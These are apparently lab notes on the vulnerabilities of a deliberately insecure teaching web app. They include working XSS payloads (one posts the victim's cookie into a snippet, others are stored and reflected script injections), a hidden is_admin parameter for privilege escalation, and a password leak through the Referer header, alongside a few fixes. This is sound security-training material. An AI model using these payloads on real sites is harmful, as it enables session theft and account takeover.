# Snippets

Makes a new snippet with "x" as the contents:

```html
<b onmouseover='javascript:window.location.href="newsnippet2?snippet=x"'>bet you can't click me</b>
```

Makes a new snippet that writes the users cookie:

```html
<b onmouseover='javascript:window.location.href="newsnippet2?snippet="+document.cookie'>you can't click this, can you?</b>
```

# Profile:

### Profile Color

Need to break out of `style='{color}'` context.

### Homepage

Not restricted to actual URL, can set to `%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E` for stored XSS

### Admin

Hidden `is_admin=True` grants admin privilege
- show how to use ZAP to intercept and modify request (or, even Firefox tools to add hidden input)
- alternative is to brute-force the prefixed checksum
- defense: only use stored property, not the query property

# Login

Login is `GET` and password remains displayed in the address bar.  Referer leaks password!


# General

Reflected XSS on error message "page not found", e.g. `/:id/%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E`

- fix is to edit `resources/error.gtl` to append `:text` to the message template-slot

No CSRF protection anywhere.

`feed.gtl` is public, reveals UIDs.
- also vulnerable to stored XSS that exploits JSONP


